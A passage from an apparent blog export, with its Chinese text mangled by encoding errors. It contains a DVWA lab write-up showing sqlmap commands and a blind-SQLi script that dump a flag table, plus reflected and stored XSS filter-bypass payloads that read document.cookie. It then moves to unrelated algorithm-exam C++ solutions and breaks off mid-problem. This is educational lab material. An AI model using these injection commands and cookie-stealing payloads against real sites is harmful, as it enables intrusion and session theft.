&quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) #print(t) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag -C fl4g --dump --batch sqlæ³¨å…¥é˜²å¾¡é€šè¿‡æŸ¥çœ‹impossibleæºç å‘ç°æ£€æµ‹äº†idæ•°æ®ç±»å‹ï¼Œä½¿ç”¨äº†é¢„ç¼–è¯‘ç»‘å®šidå˜é‡ï¼Œæœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥ï¼Œè¿™äº›å¯ä»¥åœ¨ä»¥åç¼–ç¨‹ä¸­åº”ç”¨ï¼Œä»¥ç¼–å†™å‡ºæ›´åŠ å®‰å…¨çš„ä»£ç ã€‚ &lt;?php if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; //æ£€æµ‹æäº¤çš„æ•°æ®æ˜¯å¦ä¸ºæ•°å­—ç±»å‹ // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );//é¢„ç¼–è¯‘ç»‘å®šäº†idå˜é‡ $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; XSS (Reflected)low&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;; &#125; ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº†nameå‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„XSSæ¼æ´ ã€‚ å…ˆæµ‹è¯•ä¸€ä¸‹ &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; è·å–cookie &lt;script&gt;alert(document.cookie);&lt;/script&gt; medium&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; ä»£ç å®¡è®¡åå¯ä»¥å‘ç°æ˜¯å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå°†&lt;script&gt;æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚ æ„é€ payloadï¼š &lt;sCriPt&gt;alert(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; //ä½¿ç”¨å…¶ä»–æ ‡ç­¾ &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; å…ˆä»£ç å®¡è®¡ï¼Œæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i æ˜¯æ­£åˆ™è¡¨è¾¾å¼ (.*) è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ/i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº &lt;script&gt; æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚ æ„é€ payloadï¼š &lt;IMG src=1 onerror=alert(document.cookie)&gt; XSS (Stored)low&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; åˆ†æ isset() å‡½æ•°åœ¨phpä¸­ç”¨æ¥æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/false trim() å‡½æ•°ä½œç”¨ä¸ºç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ stripslashes() å‡½æ•°ç”¨äºåˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ  mysqli_real_escape_string() å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå·(\\x00ï¼Œ\\nï¼Œ\\rï¼Œ\\ï¼Œ&#39;ï¼Œ&quot;ï¼Œ\\x1a) è¿›è¡Œè½¬ä¹‰ åœ¨ä»£ç ä¸­å¯¹messageï¼Œnameè¾“å…¥æ¡†å†…å®¹ æ²¡æœ‰è¿›è¡ŒXSSæ–¹é¢çš„è¿‡æ»¤å’Œæ£€æŸ¥ ä¸”é€šè¿‡ query è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚æ‰€ä»¥å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´ è¿™é‡Œname ,messageçš„è¾“å…¥æ¡†ä¸­éƒ½å­˜åœ¨xssï¼Œæ‰€ä»¥ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯nameä½ç½®æœ‰å­—æ•°é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨bpæŠ“åŒ…ä¿®æ”¹ ç”±äºæ˜¯å­˜å‚¨å‹XSS,æ‰€ä»¥æ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šå¼¹å‡ºcookieã€‚ medium&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; åˆ†æ$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); strip_tags() å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ &lt;b&gt; æ ‡ç­¾ã€‚ addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  å¯¹messageè¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç  ä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†&lt;script&gt;å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSï¼Œä¸åå°„å‹ä¸­çº§çš„ä¸€æ ·çš„æ–¹æ³• payload ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œè¾“å…¥ &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¾“å…¥&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼Œå¦‚ &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; åˆ†æ$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); strip_tags() å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ &lt;b&gt; æ ‡ç­¾ã€‚ addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  name,æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i æ˜¯æ­£åˆ™è¡¨è¾¾å¼ (.*) è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ/i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº &lt;script&gt; æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚ åªèƒ½æ¢ä¸€ä¸ªæ ‡ç­¾ &lt;IMG src=1 onerror=alert(document.cookie)&gt;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"blind sql","slug":"blind-sql","permalink":"https://sunzhengyu99.github.io/tags/blind-sql/"}]},{"title":"ç®—æ³•ä¸Šæœºå¤ä¹ ","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/ç®—æ³•ä¸Šæœºå¤ä¹ /","text":"æœ€è¿‘ç®—æ³•å®éªŒè¦ä¸Šæœºè€ƒè¯•ï¼Œæ‰€ä»¥è¿˜æ˜¯å‡†å¤‡ä¸€ä¸‹å§(è¿˜ä¸æ˜¯å› ä¸ºè‡ªå·±å¤ªèœäº†) 16çº§é¢˜ç›®é—®é¢˜ A: æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­é¢˜ç›®æè¿°é²ç­ä¸ƒå·æ˜¯ç‹è€…å³¡è°·é‡Œçš„å°„æ‰‹ï¼Œç«™æ’¸è‹±é›„ã€‚æˆ˜åœºä¸Šçš„é²ç­ä¸ƒå·ï¼Œæœºåˆ¶å¼ºå¤§çš„é²¨å˜´ç‚®ï¼Œç«‹åˆ»å°†æŒ¡åœ¨å‰è·¯çš„ä»»ä½•ç‰©ä½“è½°é£ã€‚æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œâ€œå€Ÿä½ ä»¬çš„è‚‰ä½“è¯•éªŒä¸‹æ–°å‘æ˜çš„å¨åŠ›â€ã€‚æ˜¯çš„ï¼Œè¿™å°±æ˜¯é²ç­å¤§å¸ˆå’Œä»–çš„å¤©æ‰æœºå…³é€ ç‰©é²ç­ä¸ƒå·ã€‚ç„¶è€Œï¼Œé²ç­æœ€ä¸ºè‡´å‘½çš„ç¼ºç‚¹æ˜¯è…¿çŸ­ï¼Œè·‘å¾—æ…¢ï¼Œä¸€ä¸ªç¨ä¸ç•™ç¥ï¼Œä¾¿ä¼šè¢«åˆºå®¢æ‰€å‡»æ€ã€‚ æ—¢ç„¶è…¿çŸ­ï¼Œé‚£ä¹ˆå°±æ¥å¤šå¤šè¿åŠ¨å§ï¼Œè·³è·³å°é˜¶å¯è¿˜è¡Œï¼Ÿå‡è®¾é²ç­ä¸ƒå·ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä½†æé™ä¸€æ¬¡åªèƒ½è·³ä¸Š2çº§å°é˜¶ï¼ˆè…¿çŸ­æ²¡åŠæ³•ï¼Œå˜¤å˜¤å˜¤ï¼‰ã€‚é²ç­ä¸ƒå·ç°åœ¨ä»0çº§é˜¶æ¢¯å¼€å§‹ï¼Œæœ€ç»ˆè·³ä¸Šç¬¬nçº§çš„å°é˜¶ï¼Œæ±‚æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ï¼Ÿ è¾“å…¥å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚ ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=50ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚ æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=50ï¼‰ï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šäº†ç¬¬nçº§å°é˜¶ã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šç¬¬nçº§å°é˜¶çš„è·³æ³•ç§æ•°ã€‚ æ ·ä¾‹è¾“å…¥3 3 4 50 æ ·ä¾‹è¾“å‡º3 5 20365011074 æç¤ºæ³¨æ„ç»“æœè¶…è¿‡intèŒƒå›´ï¼Œè¯·ç”¨long longç±»å‹å­˜å‚¨ans #include&lt;bits/stdc++.h&gt; using namespace std; const int N=50; long long f[N]; int main() &#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; é—®é¢˜ B: åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œé¢˜ç›®æè¿°å…ƒæ­Œæ˜¯ç‹è€…å³¡è°·é‡Œçš„åˆºå®¢ã€‚ä½•è°“è‡³é«˜æœºå…³ä¹‹ç¾å‘¢ï¼Ÿå”¯æœ‰ä»¥è‡³é«˜æƒåŠ›çš„æ‰‹ä»¤å¤ªå¤å¥‡è¿¹é‡ç°äººä¸–ï¼Œæ–¹èƒ½ç§°å¾—ä¸Šå•Šã€‚ æ˜¯çš„ï¼Œå…ƒæ­Œæ“…é•¿æ“æ§ï¼Œæ‰€åšå‚€å„¡èƒ½èµ·åˆ°ä»¥å‡ä¹±çœŸçš„ä½œç”¨ï¼Œä»Šå¤©å…ƒæ­Œçš„å‚€å„¡å˜æˆä½ çš„åˆä¸­æ•°å­¦è€å¸ˆï¼Œç»™ä½ å‡ºä¸ªæ•°å­¦é¢˜ï¼šç»™ä½ ä¸€ä¸ªæ•°å­—xï¼Œè®©ä½ æ±‚å‡ºk7ã€k6ã€k5ã€k4ã€k3ã€k2ã€k1ã€k0ï¼ˆ0&lt;=ki&lt;=9ï¼‰ï¼Œä½¿å¾—ä»¥ä¸‹ç­‰å¼1æˆç«‹ï¼Œæœ€åæ ¹æ®ç­‰å¼2æ±‚å‡ºæœ€ç»ˆanså€¼ã€‚ ç­‰å¼1ï¼š ç­‰å¼2ï¼š è¾“å…¥å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚ ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚ æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°xï¼ˆ1&lt;=x&lt;=1500000ï¼‰ã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€ç»ˆè¿ç®—ç»“æœã€‚ æ ·ä¾‹è¾“å…¥3 7 143 3223193224 æ ·ä¾‹è¾“å‡º10 151 163311433223 æç¤ºæµ‹è¯•æ•°æ®å‡å¤§äºç­‰äº1ï¼Œä¸ç”¨ç‰¹åˆ¤0 æ„Ÿè§‰å›¾ç‰‡ç­‰å¼æœ‰ç‚¹é—®é¢˜ï¼Œä¸€å¼€å§‹æ²¡ç†è§£ä»€ä¹ˆæ„æ€ï¼Œåæ¥çœ‹äº†å­¦é•¿çš„æç¤ºã€‚æœ¬è´¨å°±æ˜¯è¿›åˆ¶è½¬æ¢ã€‚ #include&lt;bits/stdc++.h&gt; using namespace std; int t,m; void convert(int n) &#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n; &#125; int main() &#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; é—®é¢˜ C: åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰é¢˜ç›®æè¿°è²‚è‰æ˜¯ç‹è€…å³¡è°·é‡Œçš„æ³•å¸ˆ/åˆºå®¢ï¼Œè²‚è‰æ‰“æ³•ä¸€å®šè¦æ³¨æ„é…åˆæŠ€èƒ½ä¸è¢«åŠ¨ã€‚åŠè‚‰å‡ºè£…åŠ ä¸Šè›‡çš®èµ°ä½ï¼Œå¾€å¾€å¯ä»¥1æ‰“5ï¼Œè½»æ¾æ‹¿ä¸‹5æ€ã€‚è¯­èŠ±å°è¢«åŠ¨æè¿°ä¸ºï¼šæŠ€èƒ½å‘½ä¸­ä¼šä¸ºæ•Œäººå åŠ èŠ±ä¹‹å°è®°ï¼Œå åŠ æ»¡4å±‚åå°è®°è§¦å‘è¢«åŠ¨ï¼Œä¼šç»™è‡ªèº«å›å¤ç”Ÿå‘½ï¼ŒåŒæ—¶ä¼šå¯¹å‘¨å›´æ•Œäººé€ æˆçœŸå®ä¼¤å®³å¹¶å‡é€Ÿã€‚æˆ‘ä»¬ç°åœ¨å¯¹è²‚è‰çš„æŠ€èƒ½åŠè¢«åŠ¨è¿›è¡Œç®€åŒ–å¦‚ä¸‹ï¼šæ¯ä½¿ç”¨1æ¬¡æŠ€èƒ½ä¼šæ”»å‡»1æ¬¡ç›®æ ‡ï¼Œæ¯æ”»å‡»3æ¬¡ç›®æ ‡ï¼Œä¼šè‡ªåŠ¨é¢å¤–æ”»å‡»1æ¬¡ç›®æ ‡ã€‚ç°åœ¨ï¼Œè²‚è‰åœ¨æ¸¸æˆä¸­ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ï¼Œè¯·é—®æ€»å…±ä¼šç»™ç›®æ ‡å¸¦æ¥å¤šå°‘æ¬¡æ”»å‡»ã€‚ è¾“å…¥å¤šç»„æµ‹è¯•æ•°æ®ï¼Œç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼Œä»£è¡¨æµ‹è¯•æ ·ä¾‹ä¸ªæ•°ã€‚æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=100ï¼‰ï¼Œä»£è¡¨è²‚è‰ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨è²‚è‰å¯¹ç›®æ ‡è¿›è¡Œäº†ansæ¬¡æ”»å‡»ã€‚ æ ·ä¾‹è¾“å…¥6 1 2 3 45 81 æ ·ä¾‹è¾“å‡º1 2 4 57 121 æç¤ºè¿™é¢˜å°±æ˜¯æ±½æ°´ç“¶çš„æ”¹ç¼–ã€‚ã€‚ã€‚ #include&lt;bits/stdc++.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0; &#125; é—®é¢˜ D: æµ·ä¹‹å¾é€”â€”â€”å­™ç­–é¢˜ç›®æè¿°å­™ç­–æ˜¯ç‹è€…å³¡è°·é‡Œçš„å¦å…‹/æˆ˜å£«ã€‚å¤§èˆ¹é å²¸ï¼Œæ±Ÿéƒ¡æ¬¢å‘¼ç€è¿æ¥äº†ä»–ä»¬çš„æ–°é¢†è¢–ï¼Œäººç§°æ±Ÿä¸œå°éœ¸ç‹çš„å¹´è½»äººã€‚æ¸¸æˆä¸­ï¼Œå­™ç­–çš„æŠ€èƒ½é•¿å¸†ç ´æµªï¼Œå¯ä»¥é©¾èˆ¹å†²é”‹ï¼Œå¯å°†èˆ¹æ’å‘æ•Œæ–¹å•ä½æˆ–è€…é˜»æŒ¡ç‰©ï¼Œå¹¶é€ æˆä¸€å®šçš„ä¼¤å®³ã€‚ ç°åœ¨ï¼Œæœ‰ä¸€ç¾¤å¥½å¥‡çš„æ±Ÿéƒ¡å°æœ‹å‹æƒ³è·Ÿç€å­™ç­–ä¸€èµ·å‡ºæµ·èˆªè¡Œï¼Œä½†å­™ç­–çš„èˆ¹æ‰¿è½½ä¸äº†æ‰€æœ‰å°æœ‹å‹ï¼Œæ‰€ä»¥å­™ç­–å†³å®šï¼Œå°½å¯èƒ½å¸¦æ›´å¤šçš„å°æœ‹å‹å‡ºæµ·ï¼Œç°åœ¨è¯·ä½ 